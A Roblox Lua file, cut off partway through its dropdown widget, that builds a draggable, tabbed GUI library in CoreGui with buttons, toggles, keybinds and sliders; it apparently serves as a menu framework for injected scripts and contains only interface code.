if game:GetService("CoreGui"):FindFirstChild("LibraryUI") then
	game:GetService("CoreGui"):FindFirstChild("LibraryUI"):Destroy()
end

local WinRarUI = Instance.new("ScreenGui")

WinRarUI.Name = "LibraryUI"
WinRarUI.Parent = game:GetService("CoreGui")
WinRarUI.ResetOnSpawn = false

game:GetService("UserInputService").InputBegan:Connect(function(I)
	if I.KeyCode == Enum.KeyCode.RightControl then
		local LibraryUI = WinRarUI
		LibraryUI.Enabled = not LibraryUI.Enabled
	end
end)
function newlib(name)
	local UI = {};
	local Main = Instance.new("ImageLabel")
	local Holder = Instance.new("Frame")
	local UIGradient = Instance.new("UIGradient")
	local TabHolder = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local UIPadding = Instance.new("UIPadding")
	local underline = Instance.new("Frame")
	local UIGradient_2 = Instance.new("UIGradient")
	local Title = Instance.new("TextLabel")
	local UIPadding_2 = Instance.new("UIPadding")

	Main.Name = "Main"
	Main.Parent = WinRarUI
	Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Main.BackgroundTransparency = 1.000
	Main.Position = UDim2.new(0.106694564, 0, 0.270889491, 0)
	Main.Size = UDim2.new(0, 577, 0, 32)
	Main.Image = "rbxassetid://3570695787"
	Main.ScaleType = Enum.ScaleType.Slice
	Main.SliceCenter = Rect.new(100, 100, 100, 100)
	Main.SliceScale = 0.030

	Holder.Name = "Holder"
	Holder.Parent = Main
	Holder.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Holder.BackgroundTransparency = 0.080
	Holder.BorderSizePixel = 0
	Holder.Position = UDim2.new(0, 0, 1.03125, 0)
	Holder.Size = UDim2.new(0, 577, 0, 343)

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(26, 26, 26))}
	UIGradient.Parent = Main

	TabHolder.Name = "TabHolder"
	TabHolder.Parent = Main
	TabHolder.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	TabHolder.BackgroundTransparency = 1.000
	TabHolder.BorderSizePixel = 0
	TabHolder.Position = UDim2.new(0.211438477, 0, -4.76837158e-07, 0)
	TabHolder.Size = UDim2.new(0, 455, 0, 32)
	TabHolder.Visible = true
	TabHolder.ZIndex = 7

	UIPadding.Parent = TabHolder
	UIPadding.PaddingLeft = UDim.new(0, 3)
	UIPadding.PaddingTop = UDim.new(0, 7)

	UIListLayout.Parent = TabHolder
	UIListLayout.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	UIListLayout.Padding = UDim.new(0, 5)

	underline.Name = "underline"
	underline.Parent = Main
	underline.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	underline.BorderSizePixel = 0
	underline.Position = UDim2.new(0, 0, 0.8125, 0)
	underline.Size = UDim2.new(0, 577, 0, 7)

	UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(26, 26, 26))}
	UIGradient_2.Parent = underline

	Title.Name = "Title"
	Title.Parent = Main
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderSizePixel = 0
	Title.Size = UDim2.new(0, 122, 0, 33)
	Title.ZIndex = 8
	Title.Font = Enum.Font.SourceSansSemibold
	Title.Text = name
	Title.TextColor3 = Color3.fromRGB(252, 252, 252)
	Title.TextSize = 15.000
	Title.TextXAlignment = Enum.TextXAlignment.Left

	UIPadding_2.Parent = Title
	UIPadding_2.PaddingBottom = UDim.new(0, 1)
	UIPadding_2.PaddingLeft = UDim.new(0, 6)
	
	local players = game:service('Players');
    local player = players.LocalPlayer;
    local mouse = player:GetMouse();
    local run = game:GetService('RunService'); -- Credits to Google Chrome!
    local stepped = run.Stepped;
    draggable = function(obj)
        spawn(function()
            obj.Active = true;
            local minitial;
            local initial;
            local isdragging;
            obj.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    isdragging = true;
                    minitial = input.Position;
                    initial = obj.Position;
                    local con;
                    con = stepped:Connect(function()
                        if isdragging then
                            local delta = Vector3.new(mouse.X, mouse.Y, 0) - minitial;
                            obj.Position = UDim2.new(initial.X.Scale, initial.X.Offset + delta.X, initial.Y.Scale, initial.Y.Offset + delta.Y)
                        else
                            con:Disconnect();
                        end;
                    end);
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            isdragging = false;
                        end;
                    end);
                end;
            end);
        end)
	end;

	draggable(Main)

	function UI.WindowTab(name)
		local UITabs = {};
		local Window = Instance.new("TextButton")
		local Container = Instance.new("Frame")
		local SideTabs = Instance.new("Frame")
		local UIPadding = Instance.new("UIPadding")
		local UIListLayout = Instance.new("UIListLayout")

		Window.Name = name
		Window.Parent = TabHolder
		Window.BackgroundColor3 = Color3.fromRGB(22, 195, 19)
		Window.BackgroundTransparency = 0.500
		Window.BorderColor3 = Color3.fromRGB(33, 83, 30)
		Window.Position = UDim2.new(0.00659340667, 0, 0.296875, 0)
		Window.Size = UDim2.new(0, 108, 0, 20)
		Window.ZIndex = 2
		Window.AutoButtonColor = false
		Window.Font = Enum.Font.SourceSans
		Window.Text = name
		Window.TextColor3 = Color3.fromRGB(240, 240, 240)
		Window.TextSize = 14.000

		Container.Name = "Container"
		Container.Parent = Holder
		Container.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		Container.BackgroundTransparency = 0.080
		Container.BorderSizePixel = 0
		Container.Size = UDim2.new(0, 577, 0, 343)
		Container.Visible = false

		SideTabs.Name = "SideTabs"
		SideTabs.Parent = Container
		SideTabs.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		SideTabs.BackgroundTransparency = 0.700
		SideTabs.BorderSizePixel = 0
		SideTabs.Position = UDim2.new(0.00173310225, 0, 0, 0)
		SideTabs.Size = UDim2.new(0, 122, 0, 342)
		SideTabs.ZIndex = 2
		SideTabs.Visible = false

		UIPadding.Parent = SideTabs
		UIPadding.PaddingLeft = UDim.new(0, 6)
		UIPadding.PaddingTop = UDim.new(0, 5)

		UIListLayout.Parent = SideTabs
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 4)

		function UITabs.ShowWindow()
			Container.Visible = true
			SideTabs.Visible = true
			Window.BackgroundTransparency = .32
			Window.Size = UDim2.new(0, 108,0, 23)
			Window.TextSize = 15
		end

		local NewHolder = Holder

		Window.MouseButton1Click:Connect(function()
			for i,v in pairs(NewHolder:GetChildren()) do
				if v:IsA("Frame") then
					v.Visible = false
				end
			end
			for i,v in pairs(TabHolder:GetChildren()) do
				if v:IsA('TextButton') then
					v.BackgroundTransparency = .5
					v.Size = UDim2.new(0, 108,0, 20)
					v.TextSize = 14
				end
			end
			Container.Visible = true
			SideTabs.Visible = true
			Window.BackgroundTransparency = .32
			Window.Size = UDim2.new(0, 108,0, 23)
			Window.TextSize = 15
		end)

		function UITabs.SideTab(name,size)
			local SideTabUI = {};
			local TabButton = Instance.new("TextButton")
			local Frame = Instance.new("Frame")
			local Tab = Instance.new("ScrollingFrame")
			local UIListLayout = Instance.new("UIListLayout")
			local UIPadding = Instance.new("UIPadding")

			TabButton.Name = name
			TabButton.Parent = SideTabs
			TabButton.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
			TabButton.BackgroundTransparency = 1.000
			TabButton.BorderColor3 = Color3.fromRGB(63, 63, 63)
			TabButton.LayoutOrder = 1
			TabButton.Position = UDim2.new(0, 0, 0.171875, 0)
			TabButton.Size = UDim2.new(0, 110, 0, 20)
			TabButton.ZIndex = 2
			TabButton.AutoButtonColor = false
			TabButton.Font = Enum.Font.SourceSans
			TabButton.Text = name
			TabButton.TextColor3 = Color3.fromRGB(240, 240, 240)
			TabButton.TextSize = 14.000

			Frame.Parent = TabButton
			Frame.BackgroundColor3 = Color3.fromRGB(49, 218, 46)
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(0.0350000001, 0, 0, 20)
			Frame.Visible = false

			function SideTabUI.ShowTab()
				TabButton.TextSize = 15
				TabButton.BackgroundTransparency = .5
				Frame.Visible = true
				Tab.Visible = true
			end

			Tab.Name = "Tabs"
			Tab.Parent = Container
			Tab.Active = true
			Tab.BackgroundColor3 = Color3.fromRGB(31, 35, 37)
			Tab.BackgroundTransparency = 1.000
			Tab.BorderColor3 = Color3.fromRGB(27, 42, 53)
			Tab.BorderSizePixel = 0
			Tab.Position = UDim2.new(0.216637775, 0, 0.00290708849, 0)
			Tab.Size = UDim2.new(0, 450, 0, 342)
			Tab.ZIndex = 2
			Tab.CanvasSize = UDim2.new(0,0,size,0)
			Tab.ScrollBarThickness = 5
			Tab.Visible = false

			UIListLayout.Parent = Tab
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 5)

			UIPadding.Parent = Tab
			UIPadding.PaddingBottom = UDim.new(0, 2)
			UIPadding.PaddingLeft = UDim.new(0, 2)
			UIPadding.PaddingTop = UDim.new(0, 5)

			TabButton.MouseButton1Click:Connect(function()
				for i,v in pairs(Container:GetChildren()) do
					if v.Name == "Tabs" then
						v.Visible = false
					end
				end
				for i,v in pairs(SideTabs:GetChildren()) do
					if v:IsA("TextButton") then
						v.TextSize = 14
						v.BackgroundTransparency = 1
						v.Frame.Visible = false
					end
				end
				Tab.Visible = true
				TabButton.TextSize = 15
				TabButton.BackgroundTransparency = .5
				TabButton.Frame.Visible = true
			end)

			function SideTabUI.Section(name)
				local SectionUI = {};
				local Section = Instance.new("Frame")
				local SectionTitle = Instance.new("TextLabel")
				local Underline = Instance.new("ImageLabel")

				Section.Name = name
				Section.Parent = Tab
				Section.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
				Section.BorderSizePixel = 0
				Section.Position = UDim2.new(0.00447427295, 0, 0.0146198831, 0)
				Section.Size = UDim2.new(0, 438, 0, 200)

				SectionTitle.Name = "SectionName"
				SectionTitle.Parent = Section
				SectionTitle.Active = true
				SectionTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				SectionTitle.BackgroundTransparency = 1.000
				SectionTitle.BorderSizePixel = 0
				SectionTitle.LayoutOrder = 1
				SectionTitle.Size = UDim2.new(0, 442,0, 23)
				SectionTitle.ZIndex = 7
				SectionTitle.Font = Enum.Font.SourceSans
				SectionTitle.Text = name
				SectionTitle.TextColor3 = Color3.fromRGB(198, 198, 198)
				SectionTitle.TextSize = 22.000
				SectionTitle.TextXAlignment = Enum.TextXAlignment.Left

				local UIPadding = Instance.new("UIPadding")
				UIPadding.Parent = SectionTitle
				UIPadding.PaddingBottom = UDim.new(0, 2)
				UIPadding.PaddingLeft = UDim.new(0, 5)

				Underline.Name = "Underline"
				Underline.Parent = Section
				Underline.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Underline.BackgroundTransparency = 1.000
				Underline.LayoutOrder = 2
				Underline.Position = UDim2.new(0.00894965976, 0, 0.100877196, 0)
				Underline.Size = UDim2.new(0, 433, 0, 3)
				Underline.ZIndex = 6
				Underline.Image = "rbxassetid://3570695787"
				Underline.ImageColor3 = Color3.fromRGB(59, 59, 59)
				Underline.ScaleType = Enum.ScaleType.Slice
				Underline.SliceCenter = Rect.new(100, 100, 100, 100)
				Underline.SliceScale = 0.120

				local UIListLayout2 = Instance.new("UIListLayout")
				UIListLayout2.Parent = Section
				UIListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
				UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout2.Padding = UDim.new(0, 2)

				local y = 0
       		 	for i, v in pairs(Section:GetChildren()) do
            		if (not v:IsA("UIListLayout") and not v:IsA("UIPadding")) then
               			 	y = y + v.AbsoluteSize.Y + 2;
            			end
        			end
        		Section.Size = UDim2.new(0, 438, 0, y)

				function SectionUI:Resize()
        		local y = 0
       		 	for i, v in pairs(Section:GetChildren()) do
            		if (not v:IsA("UIListLayout") and not v:IsA("UIPadding")) then
               			 	y = y + v.AbsoluteSize.Y + 2;
            			end
        			end
        		Section.Size = UDim2.new(0, 438, 0, y)
    			end	

				SectionUI:Resize()

				function SectionUI.Label(name)
					local LabelHolder = Instance.new("Frame")
					local Label = Instance.new("TextLabel")

					LabelHolder.Name = "LabelHolder"
					LabelHolder.Parent = Section
					LabelHolder.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					LabelHolder.BackgroundTransparency = 1.000
					LabelHolder.BorderSizePixel = 0
					LabelHolder.LayoutOrder = 3
					LabelHolder.Position = UDim2.new(0.00570776267, 0, 0.220588237, 0)
					LabelHolder.Size = UDim2.new(0, 432, 0, 30)

					Label.Name = "Label"
					Label.Parent = LabelHolder
					Label.AnchorPoint = Vector2.new(0, 0.00999999978)
					Label.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
					Label.BorderColor3 = Color3.fromRGB(58, 58, 58)
					Label.Position = UDim2.new(0.00499999989, 0, 0.0700000003, 0)
					Label.Size = UDim2.new(0.987999976, 1, 0.829999983, 1)
					Label.Font = Enum.Font.SourceSans
					Label.LineHeight = 1.1
					Label.Text = name
					Label.TextColor3 = Color3.fromRGB(194, 194, 194)
					Label.TextSize = 20.000
					SectionUI:Resize()
				end

				function SectionUI.Button(name,callback)
					local ButtonHolder = Instance.new("Frame")
					local Button = Instance.new("TextButton")
					local Circle = Instance.new("ImageLabel")

					ButtonHolder.Name = "ButtonHolder"
					ButtonHolder.Parent = Section
					ButtonHolder.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					ButtonHolder.BorderSizePixel = 0
					ButtonHolder.LayoutOrder = 3
					ButtonHolder.Position = UDim2.new(0.008, 0,0.221, 0)
					ButtonHolder.Size = UDim2.new(0, 432, 0, 30)

					Button.Name = "Button"
					Button.Parent = ButtonHolder
					Button.AnchorPoint = Vector2.new(0, 0.01)
					Button.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
					Button.BorderSizePixel = 0
					Button.ClipsDescendants = true
					Button.Position = UDim2.new(0.004, 0,0.08, 0)
					Button.Size = UDim2.new(0.989, 1,0.83, 1)
					Button.AutoButtonColor = false
					Button.Text = name
					Button.Font = Enum.Font.SourceSans
					Button.TextColor3 = Color3.fromRGB(166, 166, 166)
					Button.TextSize = 20.000

					Circle.Name = "Circle"
					Circle.Parent = game:GetService("CoreGui"):WaitForChild("Piano UIs")
					Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					Circle.BackgroundTransparency = 1.000
					Circle.ZIndex = 10
					Circle.Image = "http://www.roblox.com/asset/?id=33112574"
					Circle.ImageColor3 = Color3.fromRGB(126, 126, 126)
					Circle.ImageTransparency = 0.700

					function CircleClick(Button, X, Y)
						coroutine.wrap(function()
						local Circle = game:GetService("CoreGui"):WaitForChild("Piano UIs"):WaitForChild("Circle"):Clone()
						Circle.Parent = Button
						local NewX = X - Circle.AbsolutePosition.X
						local NewY = Y - Circle.AbsolutePosition.Y
						Circle.Position = UDim2.new(0, NewX, 0, NewY)
									
						local Size = 0
						if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
							Size = Button.AbsoluteSize.X*1.5
						elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
							Size = Button.AbsoluteSize.Y*1.5
						elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
							Size = Button.AbsoluteSize.X*1.5
						end
									
						local Time = 0.5
						Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
							for i=1,10 do
								Circle.ImageTransparency = Circle.ImageTransparency + 0.03
									wait(Time/10)
								end
							Circle:Destroy()
						end)()
					end
							
					local Mouse = game.Players.LocalPlayer:GetMouse()
					Button.MouseButton1Click:Connect(function()
						callback()
						CircleClick(Button,Mouse.X,Mouse.Y)
					end)
					SectionUI:Resize()
				end

				function SectionUI.KeyBind(name,default,callback)
					local KeybindHolder = Instance.new("Frame")
					local KeyBindText = Instance.new("TextLabel")
					local UIPadding = Instance.new("UIPadding")
					local KeybindButton = Instance.new("TextButton")

					KeybindHolder.Name = "KeybindHolder"
					KeybindHolder.Parent = Section
					KeybindHolder.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					KeybindHolder.BorderSizePixel = 0
					KeybindHolder.LayoutOrder = 3
					KeybindHolder.Position = UDim2.new(0.00570776267, 0, 0.220588237, 0)
					KeybindHolder.Size = UDim2.new(0, 432, 0, 30)

					KeyBindText.Name = "KeyBindText"
					KeyBindText.Parent = KeybindHolder
					KeyBindText.Active = true
					KeyBindText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					KeyBindText.BackgroundTransparency = 1.000
					KeyBindText.BorderSizePixel = 0
					KeyBindText.Size = UDim2.new(0, 431, 0, 30)
					KeyBindText.Font = Enum.Font.SourceSans
					KeyBindText.Text = name
					KeyBindText.TextColor3 = Color3.fromRGB(198, 198, 198)
					KeyBindText.TextSize = 18.000
					KeyBindText.TextXAlignment = Enum.TextXAlignment.Left

					UIPadding.Parent = KeyBindText
					UIPadding.PaddingBottom = UDim.new(0, 3)
					UIPadding.PaddingLeft = UDim.new(0, 5)

					KeybindButton.Name = "KeybindButton"
					KeybindButton.Parent = KeybindHolder
					KeybindButton.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
					KeybindButton.BorderSizePixel = 0
					KeybindButton.Position = UDim2.new(0.810000002, 0, 0.100000001, 0)
					KeybindButton.Size = UDim2.new(0, 79, 0, 24)
					KeybindButton.AutoButtonColor = false
					KeybindButton.Font = Enum.Font.SourceSans
					KeybindButton.Text = ""
					KeybindButton.TextColor3 = Color3.fromRGB(166, 166, 166)
					KeybindButton.TextSize = 15.000

					local userInputService = game:GetService("UserInputService")
					local waitingForKeyPress, currentKey
					KeybindButton.Text = tostring(default):sub(14,tostring(default):len())
						
					KeybindButton.MouseButton1Click:Connect(function()
						KeybindButton.Text = "..."
						waitingForKeyPress = true
					end)
					
					local Blacklisted = {}
						
					userInputService.InputBegan:Connect(function(Input,j)
						local keyName = string.split(tostring(Input.KeyCode), ".")[3]
						local BlacklistedKeys = Blacklisted[Input.KeyCode]
						if waitingForKeyPress and keyName ~= "Unknown" and keyName ~= BlacklistedKeys and not j then
						   	KeybindButton.Text = keyName
						    currentKey = Input.KeyCode
						    waitingForKeyPress = false
						end
						if not waitingForKeyPress and Input.KeyCode == currentKey and not j then
							callback(Input.KeyCode or default)
						end
					end)
					SectionUI:Resize()
				end

				function SectionUI.Toggle(name,default,callback)
					local ToggleHolder = Instance.new("Frame")
					local ToggleText = Instance.new("TextLabel")
					local UIPadding = Instance.new("UIPadding")
					local ToggleButton = Instance.new("TextButton")

					ToggleHolder.Name = "ToggleHolder"
					ToggleHolder.Parent = Section
					ToggleHolder.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					ToggleHolder.BorderSizePixel = 0
					ToggleHolder.LayoutOrder = 3
					ToggleHolder.Position = UDim2.new(0.00570776267, 0, 0.220588237, 0)
					ToggleHolder.Size = UDim2.new(0, 432, 0, 30)

					ToggleText.Name = "ToggleText"
					ToggleText.Parent = ToggleHolder
					ToggleText.Active = true
					ToggleText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					ToggleText.BackgroundTransparency = 1.000
					ToggleText.BorderSizePixel = 0
					ToggleText.Size = UDim2.new(0, 431, 0, 30)
					ToggleText.Font = Enum.Font.SourceSans
					ToggleText.Text = name
					ToggleText.TextColor3 = Color3.fromRGB(198, 198, 198)
					ToggleText.TextSize = 18.000
					ToggleText.TextXAlignment = Enum.TextXAlignment.Left

					UIPadding.Parent = ToggleText
					UIPadding.PaddingBottom = UDim.new(0, 3)
					UIPadding.PaddingLeft = UDim.new(0, 5)

					ToggleButton.Name = "ToggleButton"
					ToggleButton.Parent = ToggleHolder
					ToggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
					ToggleButton.BorderColor3 = Color3.fromRGB(40, 40, 40)
					ToggleButton.Position = UDim2.new(0.935000002, 0, 0.100000001, 0)
					ToggleButton.Size = UDim2.new(0, 24, 0, 24)
					ToggleButton.AutoButtonColor = false
					ToggleButton.Font = Enum.Font.SourceSans
					ToggleButton.Text = "X"
					ToggleButton.TextColor3 = Color3.fromRGB(197, 197, 197)
					ToggleButton.TextSize = 25.000
					ToggleButton.TextTransparency = 1.000
					
					local Toggled = default;
					if Toggled then
						ToggleButton.TextTransparency = 0
						Toggled = true
					else
						ToggleButton.TextTransparency = 1.000
						Toggled = false
					end
						
					local tweenInfo = TweenInfo.new(.15,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0)
						
					ToggleButton.MouseButton1Click:Connect(function()
						Toggled = not Toggled
						callback(Toggled)
						local Transparency = Toggled and 0 or 1
						game:GetService("TweenService"):Create(ToggleButton,tweenInfo,{TextTransparency = Transparency}):Play()
					end)
					SectionUI:Resize()
				end

				function SectionUI.Slider(name,min,max,default,precise,callback)
					local SliderHolder = Instance.new("Frame")
					local Slider = Instance.new("TextButton")
					local Fill = Instance.new("Frame")
					local UIGradient = Instance.new("UIGradient")
					local ValueSlider = Instance.new("TextLabel")
					local UIPadding = Instance.new("UIPadding")
					local SliderText = Instance.new("TextLabel")
					local UIPadding_2 = Instance.new("UIPadding")
					local SetSlider = Instance.new("TextBox")

					SliderHolder.Name = "SliderHolder"
					SliderHolder.Parent = Section
					SliderHolder.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					SliderHolder.BorderSizePixel = 0
					SliderHolder.LayoutOrder = 3
					SliderHolder.Position = UDim2.new(0.00570776267, 0, 0.455882341, 0)
					SliderHolder.Size = UDim2.new(0, 432, 0, 40)

					Slider.Name = "Slider"
					Slider.Parent = SliderHolder
					Slider.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
					Slider.BorderSizePixel = 0
					Slider.Position = UDim2.new(0.0189999994, 0, 0.680000007, 0)
					Slider.Size = UDim2.new(0, 415, 0, 4)
					Slider.AutoButtonColor = false
					Slider.Font = Enum.Font.SourceSans
					Slider.Text = ""
					Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
					Slider.TextSize = 14.000

					Fill.Name = "Fill"
					Fill.Parent = Slider
					Fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					Fill.BorderSizePixel = 0
					Fill.LayoutOrder = 3
					Fill.Size = UDim2.new(0, 0, 0, 4)

					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(32, 157, 53)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(80, 162, 44))}
					UIGradient.Parent = Fill

					ValueSlider.Name = "ValueSlider"
					ValueSlider.Parent = Slider
					ValueSlider.Active = true
					ValueSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					ValueSlider.BackgroundTransparency = 1.000
					ValueSlider.BorderSizePixel = 0
					ValueSlider.Position = UDim2.new(-0.0186192524, 0, -6.80000305, 0)
					ValueSlider.Size = UDim2.new(0, 431, 0, 22)
					ValueSlider.Font = Enum.Font.SourceSans
					ValueSlider.Text = "Minimum/Maximum"
					ValueSlider.TextColor3 = Color3.fromRGB(198, 198, 198)
					ValueSlider.TextSize = 14.000

					UIPadding.Parent = ValueSlider
					UIPadding.PaddingBottom = UDim.new(0, 4)

					SliderText.Name = "SliderText"
					SliderText.Parent = SliderHolder
					SliderText.Active = true
					SliderText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					SliderText.BackgroundTransparency = 1.000
					SliderText.BorderSizePixel = 0
					SliderText.Position = UDim2.new(0.018999977, 0, 0, 0)
					SliderText.Size = UDim2.new(0, 415, 0, 22)
					SliderText.Font = Enum.Font.SourceSans
					SliderText.Text = name
					SliderText.TextColor3 = Color3.fromRGB(198, 198, 198)
					SliderText.TextSize = 16.000
					SliderText.TextXAlignment = Enum.TextXAlignment.Left

					UIPadding_2.Parent = SliderText
					UIPadding_2.PaddingBottom = UDim.new(0, 2)

					SetSlider.Name = "SetSlider"
					SetSlider.Parent = SliderHolder
					SetSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
					SetSlider.BackgroundTransparency = 1.000
					SetSlider.BorderColor3 = Color3.fromRGB(58, 58, 58)
					SetSlider.Position = UDim2.new(0.858524144, 0, 0.0500000007, 0)
					SetSlider.Size = UDim2.new(0, 51, 0, 16)
					SetSlider.Font = Enum.Font.SourceSans
					SetSlider.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
					SetSlider.PlaceholderText = "Slider Int"
					SetSlider.Text = ""
					SetSlider.TextColor3 = Color3.fromRGB(178, 178, 178)
					SetSlider.TextSize = 14.000
					SetSlider.TextXAlignment = Enum.TextXAlignment.Right

					local Connection;
					local RunService = game:GetService("RunService");
					local UIS = game:GetService("UserInputService");
						
					local tweenInfo = TweenInfo.new(.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0)
						
					local function Fade(Object,Number)
						game:GetService("TweenService"):Create(Object,tweenInfo,{TextTransparency = tonumber(Number)}):Play()
					end
						
					UIS.InputEnded:Connect(function(Input)
						if Input.UserInputType == Enum.UserInputType.MouseButton1 then
							if (Connection) then
								Connection:Disconnect();
								Connection = nil;
								Fade(ValueSlider,1)
							end;
						end;
					end);
						
					local Vals = {
						["Minimum"] = min,
						["Maximum"] = max
					}
						
					ValueSlider.Text = Vals.Minimum .. "/" .. Vals.Maximum
						
					Slider.MouseButton1Down:Connect(function()
						if (Connection) then
							Connection:Disconnect();
						end;
							
						Connection = RunService.Stepped:Connect(function()
							local Mouse = UIS:GetMouseLocation();
							local Percentage = math.clamp((Mouse.X - Slider.AbsolutePosition.X)/(Slider.AbsoluteSize.X),0,1)
							local ValueToNumber = Vals.Minimum + (Vals.Maximum - Vals.Minimum)*Percentage
							
							if precise then
								ValueToNumber =tostring(ValueToNumber):sub(1,4)
							else
								ValueToNumber = math.floor(ValueToNumber)
							end
							
							ValueSlider.Text = ValueToNumber .. "/" .. Vals.Maximum
							
							game:GetService("TweenService"):Create(Fill,tweenInfo,{Size = UDim2.new(Percentage,0,0,4)}):Play()
							Fade(ValueSlider,0)
							callback(tonumber(ValueToNumber))
							SetSlider.Text = ValueToNumber
						end);
					end);
					
					local function SetValue(value)
						local percent = 1 - ((Vals.Maximum - value)/(Vals.Maximum - Vals.Minimum))
						local Number = value
						
						Number = math.floor(Number)
					
						game:GetService("TweenService"):Create(Fill,tweenInfo,{Size = UDim2.new(percent,0,0,4)}):Play()
						ValueSlider.Text = Number .. "/" .. Vals.Maximum
					end

					SetValue(default or Vals.Minimum)
					
					SetSlider.Changed:Connect(function()
						pcall(function()
							local Value = tonumber(SetSlider.Text)
							if Value >= Vals.Minimum and Value <= Vals.Maximum then
									SetValue(tonumber(SetSlider.Text))
									callback(tonumber(SetSlider.Text))
								end
							end)
						end)
					
					SetSlider.FocusLost:Connect(function()
						SetSlider.Text = tonumber(SetSlider.Text)
					end)
					SectionUI:Resize()
				end
				function SectionUI.Dropdown(name,list,callback)
					local DropFrame = Instance.new("Frame")
					local Dropdown = Instance.new("Frame")
					local DropdownText = Instance.new("TextLabel")
					local UIPadding = Instance.new("UIPadding")
					local ToggleButton = Instance.new("ImageButton")
					local DropdownObjects = Instance.new("Frame")
					local UIPadding_2 = Instance.new("UIPadding")
					local UIListLayout = Instance.new("UIListLayout")

					DropFrame.Name = "DropFrame"
					DropFrame.Parent = Section
					DropFrame.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					DropFrame.BorderSizePixel = 0
					DropFrame.LayoutOrder = 3
					DropFrame.Position = UDim2.new(0.00570776267, 0, 0.519999981, 0)
					DropFrame.Size = UDim2.new(0, 432, 0, 30)
					DropFrame.ZIndex = 6

					Dropdown.Name = "Dropdown"
					Dropdown.Parent = DropFrame
					Dropdown.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
					Dropdown.BackgroundTransparency = 0.200
					Dropdown.BorderSizePixel = 0
					Dropdown.LayoutOrder = 3
					Dropdown.Position = UDim2.new(0.00111346773, 0, 0, 0)
					Dropdown.Size = UDim2.new(0, 432, 0, 30)
					Dropdown.ZIndex = 6

					DropdownText.Name = "DropdownText"
					DropdownText.Parent = Dropdown
					DropdownText.Active = true
					DropdownText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					DropdownText.BackgroundTransparency = 1.000
					DropdownText.BorderSizePixel = 0
					DropdownText.Position = UDim2.new(0.00337645644, 0, 0, 0)
					DropdownText.Size = UDim2.new(0, 431, 0, 30)
					DropdownText.ZIndex = 6
					DropdownText.Font = Enum.Font.SourceSans
					DropdownText.Text = name
					DropdownText.TextColor3 = Color3.fromRGB(198, 198, 198)
					DropdownText.TextSize = 18.000
					DropdownText.TextXAlignment = Enum.TextXAlignment.Left

					UIPadding.Parent = DropdownText
					UIPadding.PaddingBottom = UDim.new(0, 3)
					UIPadding.PaddingLeft = UDim.new(0, 5)

					ToggleButton.Name = "ToggleButton"
					ToggleButton.Parent = Dropdown
					ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					ToggleButton.BackgroundTransparency = 1.000
					ToggleButton.BorderSizePixel = 0
					ToggleButton.Position = UDim2.new(0.944999993, 0, 0.219999999, 0)
					ToggleButton.Rotation = 90.000
					ToggleButton.Size = UDim2.new(0, 15, 0, 15)
					ToggleButton.ZIndex = 6
					ToggleButton.Image = "http://www.roblox.com/asset/?id=4888315295"
					ToggleButton.ImageColor3 = Color3.fromRGB(80, 80, 80)
